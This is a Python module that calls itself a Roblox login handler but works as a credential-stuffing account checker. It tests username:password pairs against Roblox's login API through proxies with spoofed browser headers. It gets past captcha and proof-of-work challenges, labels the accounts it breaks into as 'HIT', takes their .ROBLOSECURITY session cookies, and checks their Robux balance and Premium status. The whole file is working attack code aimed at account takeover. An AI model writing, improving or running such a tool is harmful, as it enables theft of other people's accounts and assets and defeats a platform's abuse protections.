"""
Roblox Login API Handler
========================
Handles authentication against the Roblox v2 login API including:
- CSRF token retrieval
- Login request formatting
- Captcha challenge detection and metadata extraction
- Two-step verification detection
- Account info retrieval after successful login

API Flow:
1. GET auth.roblox.com to obtain X-CSRF-TOKEN
2. POST auth.roblox.com/v2/login with credentials
3. If captcha required (code 2), extract dxBlob + unifiedCaptchaId from fieldData
4. Solve funcaptcha, then re-submit login with captcha token + challenge headers
5. Handle success (get .ROBLOSECURITY cookie), 2FA, locked, or invalid responses
"""

import json
import base64
import requests
from . import config
from .captcha_solver import CaptchaSolver


class LoginResult:
    """Represents the result of a login attempt."""

    # Result types
    HIT = "HIT"                    # Successful login
    INVALID = "INVALID"            # Wrong credentials
    TWO_STEP = "2STEP"             # Requires 2FA/verification code
    CAPTCHA_FAILED = "CAPTCHA_FAILED"  # Captcha could not be solved
    LOCKED = "LOCKED"              # Account is locked/banned
    ERROR = "ERROR"                # Unknown error

    def __init__(self, result_type, username, password, cookie=None,
                 user_id=None, display_name=None, error_message=None,
                 challenge_id=None, captcha_id=None):
        self.result_type = result_type
        self.username = username
        self.password = password
        self.cookie = cookie
        self.user_id = user_id
        self.display_name = display_name
        self.error_message = error_message
        self.challenge_id = challenge_id
        self.captcha_id = captcha_id

    def __str__(self):
        base = f"[{self.result_type}] {self.username}:{self.password}"
        if self.cookie:
            base += f" | Cookie: {self.cookie[:50]}..."
        if self.user_id:
            base += f" | UserID: {self.user_id}"
        if self.display_name:
            base += f" | Name: {self.display_name}"
        if self.error_message:
            base += f" | Error: {self.error_message}"
        return base


class RobloxLogin:
    """Handles Roblox authentication via the v2 login API."""

    def __init__(self, proxy=None):
        self.proxy = proxy
        self.captcha_solver = CaptchaSolver()
        self._init_session()

    def _init_session(self):
        """Initialize a fresh requests session with proper headers."""
        self.session = requests.Session()

        # Set standard browser headers that Roblox expects
        self.session.headers.update({
            "User-Agent": config.USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/login",
            "Sec-Ch-Ua": f'"Chromium";v="{config.CHROME_VERSION}", "Not;A=Brand";v="24", "Google Chrome";v="{config.CHROME_VERSION}"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        })

        if self.proxy:
            self.session.proxies.update({
                "http": self.proxy,
                "https": self.proxy,
            })

    def _get_csrf_token(self):
        """
        Obtain a CSRF token by sending a POST request to auth.roblox.com.
        Roblox returns the X-CSRF-TOKEN in the response headers on a failed
        POST request.
        """
        try:
            # Sending an empty POST to the login endpoint triggers a 403
            # with the CSRF token in the headers
            resp = self.session.post(
                config.ROBLOX_LOGIN_URL,
                json={},
                timeout=config.REQUEST_TIMEOUT,
            )
            csrf_token = resp.headers.get("X-CSRF-TOKEN")
            if csrf_token:
                self.session.headers["X-CSRF-TOKEN"] = csrf_token
                return csrf_token
            return None
        except Exception as e:
            return None

    def _extract_captcha_data(self, field_data):
        """
        Extract captcha metadata from the fieldData returned by Roblox.

        When a login attempt requires captcha, Roblox returns:
        - dxBlob: Base64 blob data for the funcaptcha challenge
        - unifiedCaptchaId: The captcha ID needed for re-submission

        Args:
            field_data: The fieldData string from the error response

        Returns:
            dict with 'dx_blob' and 'unified_captcha_id' keys, or None
        """
        try:
            data = json.loads(field_data)
            return {
                "dx_blob": data.get("dxBlob", ""),
                "unified_captcha_id": data.get("unifiedCaptchaId", ""),
            }
        except (json.JSONDecodeError, TypeError):
            return None

    def _login_with_captcha(self, ctype, cvalue, password, csrf_token,
                            captcha_data, max_retries=None):
        """
        Attempt login after solving the funcaptcha challenge.

        The re-login flow:
        1. Solve funcaptcha with the blob data from the initial challenge
        2. Build the challenge metadata header (base64 encoded JSON)
        3. POST to /v2/login with the captcha token and challenge headers

        Args:
            ctype: Credential type ("Username" or "Email")
            cvalue: The actual username or email value
            password: Account password
            csrf_token: The CSRF token from the initial request
            captcha_data: Dict with dx_blob and unified_captcha_id
            max_retries: Maximum number of captcha solve retries

        Returns:
            LoginResult with the outcome
        """
        max_retries = max_retries or config.MAX_CAPTCHA_RETRIES

        for attempt in range(max_retries):
            # Solve the funcaptcha
            solve_result = self.captcha_solver.solve_roblox_login(
                blob=captcha_data.get("dx_blob"),
                proxy=self.proxy,
            )

            if not solve_result["success"]:
                if attempt < max_retries - 1:
                    continue
                return LoginResult(
                    result_type=LoginResult.CAPTCHA_FAILED,
                    username=cvalue,
                    password=password,
                    captcha_id=captcha_data.get("unified_captcha_id"),
                    error_message=solve_result.get("error", "Captcha solve failed"),
                )

            captcha_token = solve_result["token"]

            # Build the challenge metadata for the header
            # The rblx-challenge-metadata header is a base64-encoded JSON object
            # containing the captcha token, unified captcha ID, and other fields
            challenge_metadata = {
                "unifiedCaptchaId": captcha_data.get("unified_captcha_id", ""),
                "captchaToken": captcha_token,
                "actionType": "Login",
            }

            metadata_b64 = base64.b64encode(
                json.dumps(challenge_metadata).encode()
            ).decode()

            # Build the login payload with captcha data
            login_payload = {
                "ctype": ctype,
                "cvalue": cvalue,
                "password": password,
                "captchaToken": captcha_token,
                "captchaProvider": "PROVIDER_ARKOSE_LABS",
                "captchaId": captcha_data.get("unified_captcha_id", ""),
            }

            # Set the challenge headers
            login_headers = {
                "X-CSRF-TOKEN": csrf_token,
                "rblx-challenge-metadata": metadata_b64,
                "rblx-challenge-id": captcha_data.get("unified_captcha_id", ""),
                "rblx-captcha-type": "Arkose Labs",
            }

            try:
                resp = self.session.post(
                    config.ROBLOX_LOGIN_URL,
                    json=login_payload,
                    headers=login_headers,
                    timeout=config.REQUEST_TIMEOUT,
                )
                return self._parse_login_response(resp, cvalue, password)

            except requests.exceptions.RequestException as e:
                if attempt < max_retries - 1:
                    continue
                return LoginResult(
                    result_type=LoginResult.ERROR,
                    username=cvalue,
                    password=password,
                    error_message=f"Request error on captcha retry: {str(e)}",
                )

        return LoginResult(
            result_type=LoginResult.CAPTCHA_FAILED,
            username=cvalue,
            password=password,
            captcha_id=captcha_data.get("unified_captcha_id"),
            error_message="Max captcha retries exhausted",
        )

    def _solve_pow_challenge(self, resp, username, password):
        """
        Solve a Roblox Proof of Work challenge and re-attempt login.

        Flow:
        1. Extract challenge metadata from response headers
        2. Get the time-lock puzzle from the PoW API
        3. Solve the puzzle (compute A^(2^T) mod N)
        4. Submit the solution to get a redemption token
        5. Continue the challenge
        6. If a follow-up captcha challenge is returned, solve it
        7. Re-submit login with challenge headers
        """
        try:
            challenge_id = resp.headers.get("rblx-challenge-id", "")
            challenge_metadata = resp.headers.get("rblx-challenge-metadata", "")
            meta = json.loads(base64.b64decode(challenge_metadata).decode())
            session_id = meta["sessionId"]

            # Get the puzzle
            puzzle_resp = self.session.get(
                "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle",
                params={"sessionID": session_id},
                timeout=config.REQUEST_TIMEOUT,
            )
            puzzle = puzzle_resp.json()
            artifacts = json.loads(puzzle["artifacts"])
            N = int(artifacts["N"])
            A = int(artifacts["A"])
            T = int(artifacts["T"])

            # Solve time-lock puzzle: compute A^(2^T) mod N
            result = A
            for _ in range(T):
                result = (result * result) % N
            answer = str(result)

            # Submit solution (may need CSRF retry)
            redeem_resp = self.session.post(
                "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle",
                json={"sessionID": session_id, "solution": answer},
                timeout=config.REQUEST_TIMEOUT,
            )
            if redeem_resp.status_code == 403:
                csrf = redeem_resp.headers.get("X-CSRF-TOKEN", "")
                if csrf:
                    self.session.headers["X-CSRF-TOKEN"] = csrf
                    redeem_resp = self.session.post(
                        "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle",
                        json={"sessionID": session_id, "solution": answer},
                        timeout=config.REQUEST_TIMEOUT,
                    )
            redeem_data = redeem_resp.json()
            if not redeem_data.get("answerCorrect"):
                return LoginResult(
                    result_type=LoginResult.CAPTCHA_FAILED,
                    username=username,
                    password=password,
                    error_message="PoW puzzle answer incorrect",
                )
            redemption_token = redeem_data.get("redemptionToken", "")

            # Continue the challenge
            challenge_metadata_str = json.dumps({
                "sessionId": session_id,
                "redemptionToken": redemption_token,
            })
            continue_resp = self.session.post(
                "https://apis.roblox.com/challenge/v1/continue",
                json={
                    "challengeId": challenge_id,
                    "challengeType": "proofofwork",
                    "challengeMetadata": challenge_metadata_str,
                },
                timeout=config.REQUEST_TIMEOUT,
            )

            if continue_resp.status_code != 200:
                return LoginResult(
                    result_type=LoginResult.CAPTCHA_FAILED,
                    username=username,
                    password=password,
                    error_message="PoW challenge continue failed",
                )

            # Check if there's a follow-up captcha challenge
            continue_data = continue_resp.json()
            next_challenge_type = continue_data.get("challengeType", "")
            next_metadata_str = continue_data.get("challengeMetadata", "")

            if next_challenge_type == "captcha" and next_metadata_str:
                try:
                    next_meta = json.loads(next_metadata_str)
                    captcha_data = {
                        "dx_blob": next_meta.get("dataExchangeBlob", ""),
                        "unified_captcha_id": next_meta.get("unifiedCaptchaId", ""),
                    }
                    csrf_token = self.session.headers.get("X-CSRF-TOKEN")
                    return self._login_with_captcha(
                        ctype="Username",
                        cvalue=username,
                        password=password,
                        csrf_token=csrf_token,
                        captcha_data=captcha_data,
                    )
                except (json.JSONDecodeError, KeyError):
                    pass

            # No follow-up challenge — re-login with PoW solution headers
            csrf_token = self._get_csrf_token()
            new_metadata = base64.b64encode(json.dumps({
                "sessionId": session_id,
                "redemptionToken": redemption_token,
            }).encode()).decode()

            login_resp = self.session.post(
                config.ROBLOX_LOGIN_URL,
                json={
                    "ctype": "Username",
                    "cvalue": username,
                    "password": password,
                },
                headers={
                    "X-CSRF-TOKEN": csrf_token,
                    "rblx-challenge-id": challenge_id,
                    "rblx-challenge-type": "proofofwork",
                    "rblx-challenge-metadata": new_metadata,
                },
                timeout=config.REQUEST_TIMEOUT,
            )
            return self._parse_login_response(login_resp, username, password)

        except Exception as e:
            return LoginResult(
                result_type=LoginResult.CAPTCHA_FAILED,
                username=username,
                password=password,
                error_message=f"PoW challenge error: {str(e)}",
            )

    def _parse_login_response(self, resp, username, password):
        """
        Parse the response from a login attempt and return a LoginResult.

        Handles the following response codes:
        - 200: Successful login
        - 403 with code 0: Wrong credentials or challenge required
        - 403 with code 1: Two-step verification required
        - 403 with code 2: Captcha required
        - 403 with code 4: Account locked/banned
        - Other codes: Unknown error
        """
        # Check for successful login - get the .ROBLOSECURITY cookie
        if resp.status_code == 200:
            cookie = None
            user_id = None
            display_name = None

            # Extract the .ROBLOSECURITY cookie
            for cookie_obj in self.session.cookies:
                if cookie_obj.name == ".ROBLOSECURITY":
                    cookie = cookie_obj.value
                    break

            # Try to get user info from the response
            try:
                data = resp.json()
                user = data.get("user", {})
                user_id = user.get("id", user.get("userId"))
                display_name = user.get("name", user.get("displayName"))
            except (json.JSONDecodeError, KeyError):
                pass

            return LoginResult(
                result_type=LoginResult.HIT,
                username=username,
                password=password,
                cookie=cookie,
                user_id=user_id,
                display_name=display_name,
            )

        # Handle error responses
        try:
            data = resp.json()
            errors = data.get("errors", [])
            if errors:
                error = errors[0]
                code = error.get("code", 0)
                message = error.get("message", "")
                field_data = error.get("fieldData", "")

                # Code 0: Could be invalid credentials OR a challenge
                # Roblox may send challenges via response headers instead
                # of fieldData (e.g. proofofwork, captcha)
                if code == 0:
                    challenge_type = resp.headers.get("rblx-challenge-type", "")
                    challenge_id_header = resp.headers.get("rblx-challenge-id", "")
                    challenge_metadata = resp.headers.get("rblx-challenge-metadata", "")

                    if challenge_type and challenge_id_header:
                        # A challenge is required — check the type
                        if challenge_type.lower() == "captcha":
                            # Captcha challenge sent via headers
                            captcha_data = None
                            if challenge_metadata:
                                try:
                                    meta = json.loads(
                                        base64.b64decode(challenge_metadata).decode()
                                    )
                                    captcha_data = {
                                        "dx_blob": meta.get("dxBlob", ""),
                                        "unified_captcha_id": meta.get(
                                            "unifiedCaptchaId", challenge_id_header
                                        ),
                                    }
                                except Exception:
                                    pass
                            if captcha_data:
                                csrf_token = resp.headers.get(
                                    "X-CSRF-TOKEN",
                                    self.session.headers.get("X-CSRF-TOKEN"),
                                )
                                return self._login_with_captcha(
                                    ctype="Username",
                                    cvalue=username,
                                    password=password,
                                    csrf_token=csrf_token,
                                    captcha_data=captcha_data,
                                )
                            return LoginResult(
                                result_type=LoginResult.CAPTCHA_FAILED,
                                username=username,
                                password=password,
                                captcha_id=challenge_id_header,
                                error_message="Captcha challenge via headers but could not extract data",
                            )
                        elif challenge_type.lower() == "proofofwork":
                            return self._solve_pow_challenge(
                                resp, username, password
                            )
                        else:
                            return LoginResult(
                                result_type=LoginResult.CAPTCHA_FAILED,
                                username=username,
                                password=password,
                                captcha_id=challenge_id_header,
                                error_message=f"Unsupported challenge type: {challenge_type}",
                            )

                    # No challenge headers — genuinely invalid credentials
                    return LoginResult(
                        result_type=LoginResult.INVALID,
                        username=username,
                        password=password,
                        error_message=message,
                    )

                # Code 1: Two-step verification required
                elif code == 1:
                    challenge_id = None
                    # Extract challenge ID from field data if available
                    if field_data:
                        try:
                            fd = json.loads(field_data) if isinstance(field_data, str) else field_data
                            challenge_id = fd.get("challengeId", fd.get("unifiedCaptchaId"))
                        except (json.JSONDecodeError, TypeError):
                            pass
                    return LoginResult(
                        result_type=LoginResult.TWO_STEP,
                        username=username,
                        password=password,
                        challenge_id=challenge_id,
                        error_message=message,
                    )

                # Code 2: Captcha required - must solve and re-submit
                elif code == 2:
                    captcha_data = self._extract_captcha_data(field_data)
                    if captcha_data:
                        # Get a fresh CSRF token for the re-submission
                        csrf_token = resp.headers.get("X-CSRF-TOKEN",
                                                      self.session.headers.get("X-CSRF-TOKEN"))
                        return self._login_with_captcha(
                            ctype="Username",
                            cvalue=username,
                            password=password,
                            csrf_token=csrf_token,
                            captcha_data=captcha_data,
                        )
                    else:
                        return LoginResult(
                            result_type=LoginResult.CAPTCHA_FAILED,
                            username=username,
                            password=password,
                            error_message="Could not extract captcha data from response",
                        )

                # Code 4: Account locked / banned
                elif code == 4:
                    return LoginResult(
                        result_type=LoginResult.LOCKED,
                        username=username,
                        password=password,
                        error_message=message,
                    )

                # Unknown error code
                else:
                    return LoginResult(
                        result_type=LoginResult.ERROR,
                        username=username,
                        password=password,
                        error_message=f"Code {code}: {message}",
                    )

        except (json.JSONDecodeError, KeyError, IndexError) as e:
            pass

        # Fallback for non-JSON or unexpected responses
        if resp.status_code == 403:
            # Try to detect if it's a captcha challenge by checking for the
            # specific response pattern
            try:
                text = resp.text
                if "robot test" in text.lower() or "captcha" in text.lower():
                    # This might be a captcha requirement we couldn't parse
                    return LoginResult(
                        result_type=LoginResult.CAPTCHA_FAILED,
                        username=username,
                        password=password,
                        error_message="Captcha required but could not parse challenge data",
                    )
            except Exception:
                pass

            return LoginResult(
                result_type=LoginResult.INVALID,
                username=username,
                password=password,
                error_message=f"HTTP 403 - Forbidden",
            )

        return LoginResult(
            result_type=LoginResult.ERROR,
            username=username,
            password=password,
            error_message=f"Unexpected HTTP {resp.status_code}",
        )

    def check_account(self, username, password):
        """
        Check a single Roblox account credential pair.

        Full flow:
        1. Get CSRF token
        2. Send login request with credentials
        3. If captcha required, solve it and re-submit
        4. Parse and return the result

        Args:
            username: Roblox username
            password: Roblox password

        Returns:
            LoginResult with the outcome
        """
        # Reset session for each check to avoid cookie pollution
        self._init_session()

        # Step 1: Get CSRF token
        csrf_token = self._get_csrf_token()
        if not csrf_token:
            return LoginResult(
                result_type=LoginResult.ERROR,
                username=username,
                password=password,
                error_message="Failed to obtain CSRF token",
            )

        # Step 2: Build login payload
        login_payload = {
            "ctype": "Username",
            "cvalue": username,
            "password": password,
        }

        # Step 3: Send login request
        try:
            resp = self.session.post(
                config.ROBLOX_LOGIN_URL,
                json=login_payload,
                timeout=config.REQUEST_TIMEOUT,
            )
        except requests.exceptions.RequestException as e:
            return LoginResult(
                result_type=LoginResult.ERROR,
                username=username,
                password=password,
                error_message=f"Request failed: {str(e)}",
            )

        # Step 4: Parse response
        return self._parse_login_response(resp, username, password)

    def check_account_with_email(self, email, password):
        """Check a Roblox account using email instead of username."""
        self._init_session()

        csrf_token = self._get_csrf_token()
        if not csrf_token:
            return LoginResult(
                result_type=LoginResult.ERROR,
                username=email,
                password=password,
                error_message="Failed to obtain CSRF token",
            )

        login_payload = {
            "ctype": "Email",
            "cvalue": email,
            "password": password,
        }

        try:
            resp = self.session.post(
                config.ROBLOX_LOGIN_URL,
                json=login_payload,
                timeout=config.REQUEST_TIMEOUT,
            )
        except requests.exceptions.RequestException as e:
            return LoginResult(
                result_type=LoginResult.ERROR,
                username=email,
                password=password,
                error_message=f"Request failed: {str(e)}",
            )

        return self._parse_login_response(resp, email, password)

    def get_account_info(self, cookie):
        """
        Retrieve account information using a .ROBLOSECURITY cookie.

        Args:
            cookie: The .ROBLOSECURITY cookie value

        Returns:
            dict with account info or None
        """
        try:
            session = requests.Session()
            session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
            session.headers.update({
                "User-Agent": config.USER_AGENT,
                "Accept": "application/json",
            })

            resp = session.get(
                "https://users.roblox.com/v1/users/authenticated",
                timeout=config.REQUEST_TIMEOUT,
            )

            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass

        return None

    def get_robux_balance(self, cookie):
        """Get the Robux balance for an authenticated account."""
        try:
            session = requests.Session()
            session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
            session.headers.update({
                "User-Agent": config.USER_AGENT,
                "Accept": "application/json",
            })

            resp = session.get(
                "https://economy.roblox.com/v1/users/currency",
                timeout=config.REQUEST_TIMEOUT,
            )

            if resp.status_code == 200:
                data = resp.json()
                return data.get("robux", 0)
        except Exception:
            pass

        return 0

    def get_premium_status(self, cookie):
        """Check if the account has Roblox Premium."""
        try:
            session = requests.Session()
            session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
            session.headers.update({
                "User-Agent": config.USER_AGENT,
                "Accept": "application/json",
            })

            # First get user ID
            user_resp = session.get(
                "https://users.roblox.com/v1/users/authenticated",
                timeout=config.REQUEST_TIMEOUT,
            )

            if user_resp.status_code == 200:
                user_id = user_resp.json().get("id")
                if user_id:
                    resp = session.get(
                        f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                        timeout=config.REQUEST_TIMEOUT,
                    )
                    if resp.status_code == 200:
                        return resp.json().get("isValid", False)
        except Exception:
            pass

        return False